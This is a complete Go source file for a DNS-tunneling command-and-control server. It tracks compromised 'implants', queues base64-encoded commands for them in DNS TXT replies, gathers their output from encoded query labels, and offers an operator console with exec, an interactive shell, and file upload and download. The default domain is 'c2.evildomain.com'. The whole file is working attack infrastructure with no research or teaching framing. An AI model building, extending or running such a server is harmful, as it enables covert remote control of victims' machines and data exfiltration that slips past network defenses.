package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/miekg/dns"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	defaultListen  = ":5353"
	chunkSize      = 400 // max base64 payload per DNS label (well under 512 after overhead)
	maxQueryLabels = 6   // max subdomain labels before the domain
)

// ─── Implant State ───────────────────────────────────────────────────────────

type ImplantState struct {
	mu             sync.Mutex
	ID             string
	FirstSeen      time.Time
	LastSeen       time.Time
	PendingOutput  []string // base64 output chunks from implant, in order
	PendingCmd     string   // base64-encoded command waiting for implant
	PendingCmdSeq  int      // chunk sequence for command
	PendingCmdChunks []string
	PendingCmdTotal  int
	Interval       int   // seconds between queries (server-controlled)
}

type C2Server struct {
	mu       sync.RWMutex
	implants map[string]*ImplantState
	domain   string // e.g. "c2.evildomain.com"
}

func NewC2Server(domain string) *C2Server {
	return &C2Server{
		implants: make(map[string]*ImplantState),
		domain:   domain,
	}
}

func (s *C2Server) getOrCreate(id string) *ImplantState {
	s.mu.Lock()
	defer s.mu.Unlock()
	imp, ok := s.implants[id]
	if !ok {
		imp = &ImplantState{
			ID:        id,
			FirstSeen: time.Now(),
			LastSeen:  time.Now(),
			Interval:  30,
		}
		s.implants[id] = imp
	} else {
		imp.LastSeen = time.Now()
	}
	return imp
}

// ─── DNS Handler ─────────────────────────────────────────────────────────────

func (s *C2Server) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
	if len(req.Question) == 0 {
		return
	}

	q := req.Question[0]
	domain := dns.Fqdn(q.Name)

	// Strip trailing dot for parsing
	fqdn := strings.TrimSuffix(domain, ".")

	// We only care about our domain
	if !strings.HasSuffix(fqdn, s.domain) {
		// Return NXDOMAIN for unknown domains — looks natural
		m := new(dns.Msg)
		m.SetReply(req)
		m.Rcode = dns.RcodeNameError
		w.WriteMsg(m)
		return
	}

	// The expected fqdn format:
	// <status>.<implant-id>.<base64-output>.c2.<domain>
	// e.g., "ready.myimplant.aGVsbG8=.c2.evildomain.com"
	// or there may be additional labels for chunked data:
	// <status>.<implant-id>.<chunk-seq>.<total-chunks>.<base64-chunk>.c2.<domain>

	// Strip the domain prefix
	tail := strings.TrimSuffix(fqdn, "."+s.domain)
	tail = strings.TrimSuffix(tail, ".c2")

	if tail == "" {
		m := new(dns.Msg)
		m.SetReply(req)
		m.Rcode = dns.RcodeNameError
		w.WriteMsg(m)
		return
	}

	labels := strings.Split(tail, ".")
	if len(labels) < 2 {
		m := new(dns.Msg)
		m.SetReply(req)
		m.Rcode = dns.RcodeNameError
		w.WriteMsg(m)
		return
	}

	status := labels[0]
	implantID := labels[1]

	imp := s.getOrCreate(implantID)

	switch q.Qtype {
	case dns.TypeTXT:
		s.handleTXTQuery(w, req, imp, status, labels[2:])
	case dns.TypeA:
		// Implant is doing a lookup — return nothing for A but
		// still capture the query. Some implementations use A
		// with subdomain encoding.
		s.handleAQuery(w, req, imp, status, labels[2:])
	default:
		m := new(dns.Msg)
		m.SetReply(req)
		w.WriteMsg(m)
	}
}

func (s *C2Server) handleAQuery(w dns.ResponseWriter, req *dns.Msg, imp *ImplantState, status string, dataLabels []string) {
	m := new(dns.Msg)
	m.SetReply(req)

	// Still process any data encoded in the query
	if len(dataLabels) > 0 {
		s.processImplantData(imp, status, dataLabels)
	}

	// Return NXDOMAIN — no A records here
	m.Rcode = dns.RcodeNameError
	w.WriteMsg(m)
}

func (s *C2Server) handleTXTQuery(w dns.ResponseWriter, req *dns.Msg, imp *ImplantState, status string, dataLabels []string) {
	m := new(dns.Msg)
	m.SetReply(req)
	m.Authoritative = true

	// Process any data coming from the implant
	if len(dataLabels) > 0 {
		s.processImplantData(imp, status, dataLabels)
	}

	// Check if there's a pending command
	imp.mu.Lock()
	cmd := imp.PendingCmd
	hasCmd := cmd != ""
	imp.mu.Unlock()

	if hasCmd {
		// Return the pending command as TXT records
		imp.mu.Lock()
		command := imp.PendingCmd
		chunks := imp.PendingCmdChunks
		total := imp.PendingCmdTotal

		if total <= 1 {
			// Single chunk — return directly
			rr, err := dns.NewRR(fmt.Sprintf("%s TXT \"%s\"", dns.Fqdn(req.Question[0].Name), command))
			if err == nil {
				m.Answer = append(m.Answer, rr)
			}
			// Clear the command
			imp.PendingCmd = ""
			imp.PendingCmdChunks = nil
			imp.PendingCmdTotal = 0
			imp.PendingCmdSeq = 0
		} else {
			// Send next chunk
			if imp.PendingCmdSeq < len(chunks) {
				chunk := chunks[imp.PendingCmdSeq]
				chunkLabel := fmt.Sprintf("%s.%d.%d", chunk, imp.PendingCmdSeq+1, total)
				rr, err := dns.NewRR(fmt.Sprintf("%s TXT \"%s\"", dns.Fqdn(req.Question[0].Name), chunkLabel))
				if err == nil {
					m.Answer = append(m.Answer, rr)
				}
				imp.PendingCmdSeq++
				if imp.PendingCmdSeq >= total {
					imp.PendingCmd = ""
					imp.PendingCmdChunks = nil
					imp.PendingCmdTotal = 0
					imp.PendingCmdSeq = 0
				}
			}
		}
		imp.mu.Unlock()
	} else {
		// No pending command — return empty TXT (just a space)
		rr, err := dns.NewRR(fmt.Sprintf("%s TXT \"\"", dns.Fqdn(req.Question[0].Name)))
		if err == nil {
			m.Answer = append(m.Answer, rr)
		}
	}

	w.WriteMsg(m)
}

func (s *C2Server) processImplantData(imp *ImplantState, status string, dataLabels []string) {
	// Parse dataLabels:
	// For simple: [base64output]
	// For chunked: [chunk-seq, total-chunks, base64chunk, ...]
	// Multiple base64 chunks can appear

	var outputChunks []string
	remainingLabels := dataLabels

	for len(remainingLabels) > 0 {
		// Check if next labels look like a chunked header: seq.total.data
		// or just raw data
		label := remainingLabels[0]

		// Try to decode as base64
		decoded, err := decodeB64Safe(label)
		if err == nil && len(decoded) > 0 {
			outputChunks = append(outputChunks, label)
			remainingLabels = remainingLabels[1:]
		} else {
			// Check for seq.total.data pattern
			if len(remainingLabels) >= 3 {
				seq, err1 := strconv.Atoi(remainingLabels[0])
				total, err2 := strconv.Atoi(remainingLabels[1])
				if err1 == nil && err2 == nil && seq > 0 && total > 0 && seq <= total {
					data := remainingLabels[2]
					outputChunks = append(outputChunks, fmt.Sprintf("[%d/%d]%s", seq, total, data))
					remainingLabels = remainingLabels[3:]
					continue
				}
			}
			// Unknown format, skip
			remainingLabels = remainingLabels[1:]
		}
	}

	if len(outputChunks) > 0 {
		imp.mu.Lock()
		imp.PendingOutput = append(imp.PendingOutput, outputChunks...)
		imp.mu.Unlock()
	}
}

// ─── Command Queueing ────────────────────────────────────────────────────────

func (s *C2Server) QueueCommand(id string, command string) error {
	s.mu.RLock()
	imp, ok := s.implants[id]
	s.mu.RUnlock()
	if !ok {
		return fmt.Errorf("implant %s not found", id)
	}

	encoded := base64.StdEncoding.EncodeToString([]byte(command))

	// If the command fits in a single chunk, send it directly
	if len(encoded) <= chunkSize {
		imp.mu.Lock()
		imp.PendingCmd = encoded
		imp.PendingCmdChunks = nil
		imp.PendingCmdTotal = 1
		imp.PendingCmdSeq = 0
		imp.mu.Unlock()
		return nil
	}

	// Chunk the command
	chunks := chunkString(encoded, chunkSize)
	imp.mu.Lock()
	imp.PendingCmd = encoded
	imp.PendingCmdChunks = chunks
	imp.PendingCmdTotal = len(chunks)
	imp.PendingCmdSeq = 0
	imp.mu.Unlock()

	return nil
}

func (s *C2Server) QueueCommandRaw(id string, encodedCmd string) error {
	s.mu.RLock()
	imp, ok := s.implants[id]
	s.mu.RUnlock()
	if !ok {
		return fmt.Errorf("implant %s not found", id)
	}

	if len(encodedCmd) <= chunkSize {
		imp.mu.Lock()
		imp.PendingCmd = encodedCmd
		imp.PendingCmdChunks = nil
		imp.PendingCmdTotal = 1
		imp.PendingCmdSeq = 0
		imp.mu.Unlock()
		return nil
	}

	chunks := chunkString(encodedCmd, chunkSize)
	imp.mu.Lock()
	imp.PendingCmd = encodedCmd
	imp.PendingCmdChunks = chunks
	imp.PendingCmdTotal = len(chunks)
	imp.PendingCmdSeq = 0
	imp.mu.Unlock()
	return nil
}

func (s *C2Server) SetInterval(id string, interval int) error {
	s.mu.RLock()
	imp, ok := s.implants[id]
	s.mu.RUnlock()
	if !ok {
		return fmt.Errorf("implant %s not found", id)
	}
	imp.mu.Lock()
	imp.Interval = interval
	imp.mu.Unlock()

	// Queue a special "INTERVAL:<N>" command to tell the implant
	cmd := fmt.Sprintf("__INTERVAL__:%d", interval)
	return s.QueueCommand(id, cmd)
}

// ─── Operator Interface ──────────────────────────────────────────────────────

func operatorUI(srv *C2Server, shutdown chan struct{}) {
	reader := bufio.NewReader(os.Stdin)
	var selectedID string

	// Read a single line and then check behavior
	fmt.Println("╔══════════════════════════════════════════════╗")
	fmt.Println("║      DNS Tunneling C2 — Operator Console     ║")
	fmt.Println("╚══════════════════════════════════════════════╝")
	fmt.Println()
	printHelp()

	for {
		select {
		case <-shutdown:
			fmt.Println("Shutting down...")
			return
		default:
		}

		prefix := "C2> "
		if selectedID != "" {
			prefix = fmt.Sprintf("C2[%s]> ", selectedID)
		}
		fmt.Print(prefix)

		input, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				// EOF from stdin (daemon/pipe mode) — wait for signal
				fmt.Println("\nDaemon mode — waiting for signal to shut down...")
				<-shutdown
				return
			}
			log.Printf("Read error: %v", err)
			continue
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		args := strings.Fields(input)
		cmd := args[0]

		switch cmd {
		case "help", "h", "?":
			printHelp()

		case "list", "ls":
			listImplants(srv)

		case "use":
			if len(args) < 2 {
				fmt.Println("Usage: use <implant-id>")
				continue
			}
			id := args[1]
			srv.mu.RLock()
			_, ok := srv.implants[id]
			srv.mu.RUnlock()
			if !ok {
				fmt.Printf("Implant %s not found\n", id)
				continue
			}
			selectedID = id
			fmt.Printf("Selected implant: %s\n", id)

		case "back":
			if selectedID != "" {
				fmt.Printf("Deselected implant %s\n", selectedID)
				selectedID = ""
			} else {
				fmt.Println("No implant selected")
			}

		case "exec":
			if selectedID == "" {
				fmt.Println("No implant selected. Use 'use <id>' first.")
				continue
			}
			if len(args) < 2 {
				fmt.Println("Usage: exec <command>")
				continue
			}
			command := strings.Join(args[1:], " ")
			err := srv.QueueCommand(selectedID, command)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
			} else {
				fmt.Printf("Queued command for %s: %s\n", selectedID, command)
			}

		case "interval":
			if selectedID == "" {
				fmt.Println("No implant selected.")
				continue
			}
			if len(args) < 2 {
				// Show current interval
				srv.mu.RLock()
				imp, ok := srv.implants[selectedID]
				srv.mu.RUnlock()
				if ok {
					imp.mu.Lock()
					fmt.Printf("Current interval: %ds\n", imp.Interval)
					imp.mu.Unlock()
				}
				continue
			}
			n, err := strconv.Atoi(args[1])
			if err != nil || n < 1 {
				fmt.Println("Interval must be a positive integer (seconds)")
				continue
			}
			err = srv.SetInterval(selectedID, n)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
			} else {
				fmt.Printf("Set interval for %s to %ds\n", selectedID, n)
			}

		case "upload":
			if selectedID == "" {
				fmt.Println("No implant selected.")
				continue
			}
			if len(args) < 3 {
				fmt.Println("Usage: upload <local_file> <remote_path>")
				continue
			}
			localFile := args[1]
			remotePath := args[2]
			handleUpload(srv, selectedID, localFile, remotePath)

		case "download":
			if selectedID == "" {
				fmt.Println("No implant selected.")
				continue
			}
			if len(args) < 2 {
				fmt.Println("Usage: download <remote_path>")
				continue
			}
			remotePath := args[1]
			handleDownload(srv, selectedID, remotePath)

		case "output":
			if selectedID == "" {
				fmt.Println("No implant selected.")
				continue
			}
			srv.mu.RLock()
			imp, ok := srv.implants[selectedID]
			srv.mu.RUnlock()
			if !ok {
				fmt.Println("Implant not found")
				continue
			}
			imp.mu.Lock()
			if len(imp.PendingOutput) == 0 {
				fmt.Println("No pending output")
			} else {
				fmt.Printf("=== Output for %s ===\n", selectedID)
				for _, chunk := range imp.PendingOutput {
					decoded, err := decodeB64Safe(chunk)
					if err == nil {
						fmt.Print(string(decoded))
					} else {
						fmt.Print(chunk)
					}
				}
				fmt.Println()
				fmt.Println("======================")
				imp.PendingOutput = nil
			}
			imp.mu.Unlock()

		case "info":
			if selectedID == "" {
				fmt.Println("No implant selected.")
				continue
			}
			srv.mu.RLock()
			imp, ok := srv.implants[selectedID]
			srv.mu.RUnlock()
			if ok {
				imp.mu.Lock()
				fmt.Printf("Implant ID: %s\n", imp.ID)
				fmt.Printf("First Seen: %s\n", imp.FirstSeen.Format(time.RFC3339))
				fmt.Printf("Last Seen:  %s\n", imp.LastSeen.Format(time.RFC3339))
				fmt.Printf("Interval:   %ds\n", imp.Interval)
				hasCmd := imp.PendingCmd != ""
				imp.mu.Unlock()
				if hasCmd {
					fmt.Println("Command Queued: YES")
				} else {
					fmt.Println("Command Queued: no")
				}
			}

		case "clear", "cls":
			fmt.Print("\033[H\033[2J")

		case "exit", "quit", "q":
			fmt.Println("Shutting down...")
			os.Exit(0)

		case "shell":
			if selectedID == "" {
				fmt.Println("No implant selected.")
				continue
			}
			fmt.Println("Entering interactive shell mode for", selectedID)
			fmt.Println("Type 'EXIT' to return to C2 prompt")
			for {
				fmt.Printf("⌂ %s $ ", selectedID)
				line, err := reader.ReadString('\n')
				if err != nil {
					break
				}
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				if strings.ToUpper(line) == "EXIT" {
					break
				}
				err = srv.QueueCommand(selectedID, line)
				if err != nil {
					fmt.Printf("Error: %v\n", err)
				} else {
					fmt.Printf("Queued: %s\n", line)
				}
			}

		default:
			fmt.Printf("Unknown command: %s\n", cmd)
			fmt.Println("Type 'help' for available commands")
		}
	}
}

func printHelp() {
	fmt.Println("Available Commands:")
	fmt.Println("  help, h, ?     — Show this help")
	fmt.Println("  list, ls       — List connected implants")
	fmt.Println("  use <id>       — Select an implant")
	fmt.Println("  back           — Deselect current implant")
	fmt.Println("  info           — Show selected implant info")
	fmt.Println("  exec <cmd>     — Execute a command on selected implant")
	fmt.Println("  shell          — Interactive one-shot shell mode")
	fmt.Println("  interval <sec> — Set query interval for selected implant")
	fmt.Println("  upload <local> <remote> — Upload file to implant (chunked)")
	fmt.Println("  download <remote>       — Download file from implant")
	fmt.Println("  output         — Show pending output from selected implant")
	fmt.Println("  clear, cls     — Clear screen")
	fmt.Println("  exit, q        — Quit")
	fmt.Println()
}

func listImplants(srv *C2Server) {
	srv.mu.RLock()
	defer srv.mu.RUnlock()

	if len(srv.implants) == 0 {
		fmt.Println("No implants connected")
		return
	}

	ids := make([]string, 0, len(srv.implants))
	for id := range srv.implants {
		ids = append(ids, id)
	}
	sort.Strings(ids)

	fmt.Printf("%-30s %-20s %-20s %s\n", "IMPLANT ID", "FIRST SEEN", "LAST SEEN", "OUTPUT")
	fmt.Println(strings.Repeat("─", 90))
	for _, id := range ids {
		imp := srv.implants[id]
		imp.mu.Lock()
		first := imp.FirstSeen.Format("15:04:05 Jan02")
		last := imp.LastSeen.Format("15:04:05 Jan02")
		oc := len(imp.PendingOutput)
		imp.mu.Unlock()
		outputStatus := ""
		if oc > 0 {
			outputStatus = fmt.Sprintf("%d chunks", oc)
		}
		fmt.Printf("%-30s %-20s %-20s %s\n", id, first, last, outputStatus)
	}
}

// ─── File Upload/Download ────────────────────────────────────────────────────

func handleUpload(srv *C2Server, implantID, localPath, remotePath string) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("Error reading %s: %v\n", localPath, err)
		return
	}

	// Command format: __UPLOAD__:<remote_path>:<chunk_base64>
	// We send __UPLOAD_START__ with total size, then chunks, then __UPLOAD_END__
	encoded := base64.StdEncoding.EncodeToString(data)

	// First send the init command
	initCmd := fmt.Sprintf("__UPLOAD_START__:%s:%d", remotePath, len(data))
	if err := srv.QueueCommand(implantID, initCmd); err != nil {
		fmt.Printf("Error queueing upload start: %v\n", err)
		return
	}
	fmt.Printf("Upload start queued for %s -> %s (%d bytes)\n", localPath, remotePath, len(data))

	// Send chunks
	chunks := chunkString(encoded, chunkSize)
	for i, chunk := range chunks {
		chunkCmd := fmt.Sprintf("__UPLOAD_CHUNK__:%d:%d:%s", i+1, len(chunks), chunk)
		if err := srv.QueueCommand(implantID, chunkCmd); err != nil {
			fmt.Printf("Error queueing chunk %d/%d: %v\n", i+1, len(chunks), err)
			return
		}
		fmt.Printf("  Chunk %d/%d queued\n", i+1, len(chunks))
	}

	// Finalize
	endCmd := fmt.Sprintf("__UPLOAD_END__:%s", remotePath)
	if err := srv.QueueCommand(implantID, endCmd); err != nil {
		fmt.Printf("Error queueing upload end: %v\n", err)
		return
	}
	fmt.Printf("Upload complete: %s -> %s\n", localPath, remotePath)
}

func handleDownload(srv *C2Server, implantID, remotePath string) {
	cmd := fmt.Sprintf("__DOWNLOAD__:%s", remotePath)
	if err := srv.QueueCommand(implantID, cmd); err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	fmt.Printf("Download request queued for %s\n", remotePath)
	fmt.Println("Use 'output' to retrieve the file data when it arrives")
}

// ─── Utilities ───────────────────────────────────────────────────────────────

func chunkString(s string, size int) []string {
	if len(s) == 0 {
		return []string{""}
	}
	var chunks []string
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func decodeB64Safe(s string) ([]byte, error) {
	// Try standard base64 first
	data, err := base64.StdEncoding.DecodeString(s)
	if err == nil {
		return data, nil
	}
	// Try URL-safe
	data, err = base64.URLEncoding.DecodeString(s)
	if err == nil {
		return data, nil
	}
	// Try with padding fixes
	pad := 4 - len(s)%4
	if pad < 4 {
		s = s + strings.Repeat("=", pad)
	}
	return base64.StdEncoding.DecodeString(s)
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
	listenAddr := os.Getenv("C2_LISTEN")
	if listenAddr == "" {
		listenAddr = defaultListen
	}

	domain := os.Getenv("C2_DOMAIN")
	if domain == "" {
		domain = "c2.evildomain.com"
	}

	// Allow override via flags (simple approach)
	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "-listen":
			if i+1 < len(os.Args) {
				listenAddr = os.Args[i+1]
				i++
			}
		case "-domain":
			if i+1 < len(os.Args) {
				domain = os.Args[i+1]
				i++
			}
		case "-h", "--help":
			fmt.Println("DNS Tunnel C2 Server")
			fmt.Println()
			fmt.Println("Usage: c2-server [-listen :5353] [-domain c2.evildomain.com]")
			fmt.Println()
			fmt.Println("Environment variables:")
			fmt.Println("  C2_LISTEN   — Listen address (default :5353)")
			fmt.Println("  C2_DOMAIN   — C2 domain (default c2.evildomain.com)")
			fmt.Println()
			fmt.Println("For privileged port 53, use iptables:")
			fmt.Println("  sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353")
			fmt.Println("  sudo iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-port 5353")
			return
		}
	}

	serverID := os.Getenv("C2_SERVER_ID")
	if serverID == "" {
		serverID = generateID()
	}

	log.Printf("DNS Tunnel C2 Server starting...")
	log.Printf("Server ID: %s", serverID)
	log.Printf("Listening on: %s", listenAddr)
	log.Printf("Domain: %s", domain)
	log.Printf("")
	log.Printf("⚠  Running on port 5353 by default (no root needed)")
	log.Printf("   To redirect port 53 → 5353:")
	log.Printf("     sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353")
	log.Printf("")

	srv := NewC2Server(domain)

	// Start DNS server
	dns.HandleFunc(domain+".", srv.ServeDNS)

	go func() {
		udpServer := &dns.Server{
			Addr:    listenAddr,
			Net:     "udp",
			Handler: dns.DefaultServeMux,
		}

		log.Printf("UDP DNS listener starting on %s", listenAddr)
		if err := udpServer.ListenAndServe(); err != nil {
			log.Fatalf("Failed to start DNS server: %v", err)
		}
	}()

	// Give DNS server a moment to start
	time.Sleep(100 * time.Millisecond)

	// Shutdown channel for non-interactive mode
	shutdown := make(chan struct{})

	// Handle signals for clean shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		sig := <-sigCh
		log.Printf("Received signal %v, shutting down...", sig)
		close(shutdown)
	}()

	// Start operator interface
	operatorUI(srv, shutdown)

	log.Printf("Server stopped")
}
